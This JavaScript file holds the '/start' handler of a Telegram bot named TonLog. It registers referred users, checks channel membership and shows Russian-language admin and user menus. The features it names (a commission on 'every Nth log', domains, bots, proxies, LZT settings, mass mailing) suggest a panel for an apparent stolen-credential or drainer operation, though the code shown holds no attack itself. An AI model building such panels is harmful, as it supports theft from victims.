import { bot } from "../../index.js";
import config from '../../../../config.json' assert { type: 'json' };
import Database from "../../../database/index.js";
import User from "../../../database/schemas/user.js";
import commission from "../../../database/schemas/commission.js";
import checker from "../../../checker/index.js";

export default {
    name: "/start",
    async exec(message) {
        const user = await Database.getUser(message.from.id);
        
    
        if (!user) {
            const ref_code = !isNaN(+message.text.split(" ")[1]) ? message.text.split(" ")[1] : null;
            await Database.createUser(message.from.id, ref_code, message.from.username ? `@${message.from.username}` : message.from.first_name);        
            
            if (ref_code) {
                const referrer = await Database.getUser(ref_code);
                if (referrer) {
                    await bot.sendMessage(ref_code, `<b>🫂 Новый реферал ${message.from.id} присоеденился по вашей ссылке!</b>`, {
                        parse_mode: 'HTML'
                    });
                }
            }
        }

        if (user?.id === config.admin) {
            return await bot.sendPhoto(message.from.id, 'cdn/admin.png', {
                caption: `<b>✨ Административная панель <a href="https://t.me/tonlog"></a>!</b>

<b>🧾 Комиссия панели:</b> Каждый ${(await commission.findOne({})).value} лог`,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: '💻 Панель',
                                callback_data: 'admin'
                            },
                            {
                                text: '⚙️ Настройки LZT', 
                                callback_data: 'lztadmin'
                            }
                        ],
                        [
                            {
                                text: '🌐 Прокси',
                                callback_data: 'proxy'
                            },
                            {
                                text: '📢 Рассылка',
                                callback_data: 'mailer'
                            }
                        ],
                        [
                            {
                                text: '👤 Найти пользователя',
                                callback_data: 'find'
                            }
                        ],
                        [
                            {
                                text: '🏆 Топ Проекта',
                                callback_data: 'top:all'
                            }
                        ]
                    ]
                }
            });
        }


        if (!user?.member) {
            const { status } = await bot.getChatMember(isNaN(+config.channel) ? (await bot.getChat(`@${config.channel}`)).id : config.channel, message.from.id)
                .catch(() => ({ status: 'error' }));

            if (status === 'left') {
                await bot.deleteMessage(message.chat.id, message.message_id);
                const msg = await bot.sendPhoto(message.from.id, 'cdn/hi.png', {
                    caption: `👋🏻 Привет! Добро пожаловать в TonLog!

💎 Для работы с панелью вступи в наш чат! 👇🏻`,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                {
                                    text: "➕ Вступить",
                                    url: config.chat
                                }
                            ]
                        ]
                    }
                });
                return checker(message.from.id, msg.message_id);
            } else await User.updateOne({ id: message.from.id }, { $set: { member: true } });
        }

        await bot.sendMessage(message.from.id, `💎 Вам было выведено меню`, {
            reply_markup: {
                resize_keyboard: true,
                keyboard: [
                    [
                        {
                            text: '🏠 Меню'
                        }
                    ]
                ]
            }
        })

        await bot.sendPhoto(message.from.id, 'cdn/menu.png', {
            caption: `<b>⚡️ Добро пожаловать в <a href="https://t.me/tonlog">TonLog</a>!</b>

<b>🧾 Комиссия:</b> Каждый ${user?.com || (await commission.findOne({})).value} лог`,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '💻 Профиль',
                            callback_data: 'profile'
                        },
                        {
                            text: '⚙️ Настройки LZT',
                            callback_data: 'lzt'
                        }
                    ],
                    [
                        {
                            text: "🤖 Боты",
                            callback_data: 'bots'
                        },
                        {
                            text: '🌐 Домены',
                            callback_data: `domains`
                        }
                    ],
                    [
                        {
                            text: '🏆 Топ Проекта',
                            callback_data: 'top:all'
                        },
                        {
                            text: '📃 Информация',
                            callback_data: 'info'
                        }
                    ],
                    [
                        {
                            text: '👥 Реферальная система',
                            callback_data: 'ref_system'
                        }
                    ]
                ]
            }
        })
    }
}